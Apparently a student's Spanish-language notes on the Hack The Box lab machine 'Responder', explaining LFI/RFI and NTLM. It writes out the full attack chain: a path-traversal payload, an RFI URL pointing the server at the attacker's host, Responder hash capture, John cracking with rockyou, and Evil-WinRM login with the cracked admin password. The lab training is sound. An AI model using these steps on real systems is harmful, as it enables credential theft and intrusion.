![[Pasted image 20260623123827.png]]
![[Pasted image 20260623123853.png]]
![[Pasted image 20260623123836.png]]

**PHP (Hypertext Preprocessor)** es un lenguaje de programación que se ejecuta **en el servidor** para generar páginas web dinámicas.

**¿Cómo funciona?**

Cuando entras a una web hecha en PHP:

1. Tu navegador pide la página al servidor
2. El servidor ejecuta el código PHP
3. El servidor te devuelve el HTML ya generado
4. Tú solo ves el resultado, nunca el código PHP

**Analogía simple:**

- **HTML** → es el "esqueleto" fijo de la página, siempre igual
- **PHP** → es el "cocinero" que prepara contenido dinámico antes de servirte la página (datos de una base de datos, tu nombre de usuario, etc.)

**Por qué es importante en ciberseguridad:**  
PHP es uno de los lenguajes más usados en la web y también uno de los más atacados porque:

- Muchas webs antiguas tienen PHP mal configurado
- Si subes un archivo PHP malicioso a un servidor, puede ejecutar comandos (esto se llama **webshell**)
- Vulnerabilidades como SQL Injection suelen estar en código PHP mal escrito

**Ejemplos de webs hechas en PHP:**

- WordPress
- Joomla
- phpMyAdmin (que usaste en la uni)


![[Pasted image 20260623124931.png]]
![[Pasted image 20260623124553.png|377]]
El problema ahora es que el navegador no sabe cómo llegar a `unika.htb` porque no es un dominio real de internet. Tienes que decirle a tu sistema que `unika.htb` apunta a la IP de la máquina.

Edita el archivo `/etc/hosts` en la terminal:

```
sudo nano /etc/hosts
```

Y añade esta línea al final:

```
10.129.59.92    unika.htb
```

Guarda con `Ctrl+O` → Enter → `Ctrl+X` para salir.

Ahora vuelve a entrar en el navegador con `http://unika.htb` y debería cargarte la página correctamente 👍![[Pasted image 20260623124542.png]]![[Pasted image 20260623124805.png]]


![[Pasted image 20260623125122.png]]
Te están preguntando cuál de esas 4 opciones es un ejemplo de **LFI (Local File Inclusion)**.

Primero te explico qué es LFI:

**¿Qué es LFI?**  
Recuerdas que el parámetro `page` carga archivos (`french.html`, `english.html`...). La vulnerabilidad LFI ocurre cuando puedes **manipular ese parámetro para cargar cualquier archivo del servidor**, no solo los que el desarrollador tenía previstos.

**Analizando las 4 opciones:**

- `french.html` → uso normal, no es ataque
- `//10.10.14.6/somefile` → carga un archivo de **otra máquina en la red** (eso es RFI, Remote File Inclusion, no LFI)
- `../../../../../../../../windows/system32/drivers/etc/hosts` → usa `../` para **subir carpetas** hasta llegar a la raíz del sistema y leer un archivo del propio servidor (esto es LFI)
- `mimikatz.exe` → es una herramienta de hacking, no una ruta de archivo

La respuesta es: **../../../../../../../../windows/system32/drivers/etc/hosts**

Los `../` significan "sube un nivel de carpeta", y encadenándolos llegas a la raíz del sistema para leer cualquier archivo. Como es un archivo del **propio servidor local**, eso es Local File Inclusion 👍

![[Pasted image 20260623125323.png]]
- **LFI (Local File Inclusion)** → cargas un archivo del **propio servidor** (local). Los `../` te mueven por las carpetas del servidor víctima.
- **RFI (Remote File Inclusion)** → cargas un archivo desde **otra máquina en la red** (remota). La IP `10.10.14.6` es tu propia máquina atacante, así que estás diciéndole al servidor que cargue un archivo **tuyo**.

![[Pasted image 20260623125613.png]]
Tak 6
**New Technology LAN Manager**

Es un protocolo de autenticación de Windows que se usa para verificar la identidad de los usuarios en redes Windows. Es importante en ciberseguridad porque tiene vulnerabilidades conocidas que permiten capturar y crackear contraseñas, que es justo lo que va a pasar en esta máquina con la herramienta **Responder**

Task 7 
Se usa así:

```
responder -I tun0
```

Donde `tun0` es la interfaz de red de la VPN de HTB (la que conecta tu máquina con la red de HTB)

Task 8 
**John the Ripper**

Es una herramienta clásica de **crackeo de contraseñas** — coge el hash capturado (en este caso NetNTLMv2) y prueba millones de contraseñas de una wordlist hasta encontrar cuál genera el mismo hash.

Es una de las herramientas más usadas en pentesting junto con **Hashcat** (que hace lo mismo pero usando la GPU en lugar de la CPU, por lo que es mucho más rápida)


![[Pasted image 20260623130513.png]]

![[Pasted image 20260623130842.png]]![[Pasted image 20260623130906.png]]
![[Pasted image 20260623131022.png]]

**Lo que estás haciendo es un RFI (Remote File Inclusion)** — le estás diciendo al servidor: _"ve a buscar un archivo a esta otra máquina e inclúyelo"_.

Si pones la IP **del propio servidor objetivo**, le estarías diciendo "conéctate a ti mismo", lo cual no tiene ningún sentido para el ataque y no captura nada interesante.

En cambio, si pones **tu IP** (10.10.16.126), le estás diciendo al servidor: _"ve a buscar un archivo a la máquina de Ángel"_. Como tú tienes **Responder escuchando** en esa IP, cuando el servidor intenta conectarse, Responder lo intercepta y le pide autenticación — y ahí es donde **captura el hash de las credenciales** que usa el servidor para intentar autenticarse contigo.

Para esto necesitas usar **Responder** para capturar el hash y luego **John the Ripper** para crackearlo. Vamos paso a paso:

**1.** Primero averigua cuál es tu interfaz de VPN:

```
ip a
```

Busca la interfaz `tun0` y apunta tu IP.

**2.** Lanza Responder en esa interfaz:

```
sudo responder -I tun0
```

**3.** En otra terminal, usa el parámetro LFI de la web para apuntar a tu máquina:

```
http://unika.htb/index.php?page=//TU_IP/somefile
```

#### Explicacion del comando
**1. Lo que hace tu URL**

```
http://unika.htb/index.php?page=//10.10.16.126/somefile
```

Recuerda que la web tiene este código por detrás (vulnerable a LFI/RFI):

php

```php
include($_GET['page']);
```

Literalmente coge lo que pones en `page` y se lo pasa a la función `include()` de PHP, que sirve para "incluir/cargar" un archivo.

**2. Lo que pasa cuando metes una IP con `//`**

En PHP/Windows, cuando le dices a `include()` que cargue algo con el formato `//IP/archivo`, **PHP interpreta eso como una ruta de red de Windows** (lo que se llama UNC path), tipo `\\IP\archivo` — exactamente igual que cuando en Windows abres el explorador de archivos y escribes la IP de otro ordenador para ver sus carpetas compartidas.

**3. Lo que hace Windows automáticamente**

Aquí está la clave: **el propio sistema operativo Windows** (no PHP, no la web), al ver que tiene que acceder a una ruta de red (`\\10.10.16.126\...`), automáticamente intenta **autenticarse** contra esa IP usando el protocolo SMB/NTLM — es un comportamiento estándar de Windows, pasa siempre que accedes a cualquier recurso compartido en red, sin que nadie tenga que programarlo a propósito.

**4. Por qué cae en la trampa**

Windows piensa: _"vale, me piden acceder a un recurso compartido en esa IP, voy a autenticarme automáticamente con las credenciales del usuario que está ejecutando este proceso (en este caso, el servidor web, que corre con privilegios de Administrator)"_.

**5. Ahí es donde entra Responder**

Como tienes Responder escuchando exactamente en esa IP, cuando Windows intenta autenticarse, Responder **se hace pasar por un servidor SMB legítimo** y participa en el proceso de autenticación NTLM, capturando ese hash en el camino.

---

**En resumen:** el `//IP/archivo` no es un comando especial tuyo, es simplemente cómo Windows interpreta cualquier ruta de red — y tú estás aprovechando ese comportamiento normal del sistema operativo (combinado con el fallo de la web que permite controlar esa ruta) para forzar a Windows a "llamar a tu puerta"
(sustituye TU_IP por tu IP de tun0) asi una vez enviado como tenemos escuchando cualquier los eventos podemos ver que se una interaccion

### siguiente

**4.** Responder capturará el hash NetNTLMv2 del administrador. Cópialo y guárdalo en un archivo:

```
nano hash.txt
```

**5.** Crackéalo con John:

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```



Para responder esto necesitas conectarte a la máquina usando WinRM. La herramienta que se usa en Linux para conectarse a WinRM es **Evil-WinRM**.

Primero instálala si no la tienes:

```
gem install evil-winrm
```

Luego conéctate con las credenciales del administrador que crackeaste:

```
evil-winrm -i 10.129.59.92 -u administrator -p "contraseña_crackeada"
```
### Explicacion de comando
**¿Cómo sabes que toca usar Evil-WinRM?**

Lo dedujiste por el contexto de la propia máquina, no es algo arbitrario:

1. **Viste el puerto abierto en el Nmap inicial:**

```
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0
```

Ese puerto es el de **WinRM (Windows Remote Management)** — el servicio de Windows para gestión remota, equivalente a lo que sería SSH en Linux.

2. **La propia pregunta de HTB te lo confirmó:**  
    _"We'll use a Windows service to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?"_ — eso ya te estaba diciendo: "vas a necesitar conectarte remotamente con un servicio de Windows", y la respuesta (5985) confirmaba que era WinRM.
3. **Ya tienes credenciales válidas** (admin / badminton), así que el siguiente paso lógico es usarlas para entrar en algún servicio de acceso remoto — y el único que viste abierto era WinRM.

**¿Por qué Evil-WinRM en concreto?**

Es simplemente **la herramienta estándar en Linux** para conectarte a WinRM, de la misma forma que usas `ssh` para SSH o `ftp` para FTP. No hay otras alternativas tan populares — es prácticamente el "cliente oficial no oficial" para esto en pentesting.

**En resumen, el razonamiento sería:**

```
Puerto 5985 abierto (WinRM) + tienes credenciales = usa Evil-WinRM para conectarte
```

Es el mismo patrón que ya viste con Telnet, FTP, SSH... cada servicio tiene su herramienta específica para conectarte, y la reconoces por el puerto que encuentras en el Nmap 👍
Una vez dentro, navega por los escritorios de los usuarios:

### siguiente

```
cd C:\Users
dir
```

![[Pasted image 20260630181131.png]]

### 📝 Resumen — Máquina "Responder" (HTB Starting Point, Tier 1)

#### 1. Reconocimiento con Nmap

```
nmap -sC -sV <IP>
```

Encontraste varios puertos abiertos en una máquina **Windows**, entre ellos el **80 (HTTP)** y el **5985 (WinRM)**.

#### 2. Acceso a la web y descubrimiento del dominio

Al entrar a la IP por el navegador, la web te redirigió a un dominio falso (`unika.htb`). Tuviste que añadirlo manualmente en `/etc/hosts` para poder resolverlo:

```
sudo nano /etc/hosts
```

```
<IP>    unika.htb
```

#### 3. Identificar la vulnerabilidad: LFI/RFI

La web cargaba contenido según el parámetro `page` en la URL (`?page=french.html`), sin validar lo que se le pasaba — un caso clásico de inclusión de archivos.

#### 4. Explotación con RFI apuntando a tu propia máquina

```
http://unika.htb/index.php?page=//TU_IP_TUN0/somefile
```

Esto aprovecha que Windows interpreta `//IP/archivo` como una ruta de red (UNC path) e intenta **autenticarse automáticamente** contra esa IP usando el protocolo NTLM.

#### 5. Captura del hash con Responder

```
sudo responder -I tun0
```

Responder se hizo pasar por un servidor SMB legítimo, capturando el **hash NTLMv2** que el servidor objetivo envió al intentar autenticarse.

#### 6. Crackeo del hash con John the Ripper

```
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
john hash.txt --show
```

Resultado: contraseña del Administrator = **badminton**

#### 7. Acceso remoto con Evil-WinRM

```
evil-winrm -i unika.htb -u administrator -p badminton
```

Una vez dentro, navegaste por `C:\Users\mike\Desktop` con comandos de PowerShell hasta encontrar la flag.